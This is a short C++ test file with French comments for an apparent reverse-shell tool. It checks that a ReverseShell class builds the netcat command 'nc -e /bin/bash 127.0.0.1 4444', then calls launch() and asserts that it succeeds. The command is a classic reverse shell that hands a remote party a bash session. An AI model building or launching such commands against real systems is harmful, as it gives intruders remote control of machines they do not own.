#include <cassert>
#include <string>

#include "../src/reverse_shell/reverse_shell.h"

int main() {
    // Creation d'une instance de ReverseShell
    ReverseShell rs("127.0.0.1", 4444);

    // Recuperation de la commande construite
    std::string cmd = rs.getCommand();
    std::string expected = "nc -e /bin/bash 127.0.0.1 4444";

    // Verification de la commande
    assert(cmd == expected);

    // Simule la comande pour le test de launch()
    bool launchResult = rs.launch();
    assert(launchResult == true);

    return 0;
}
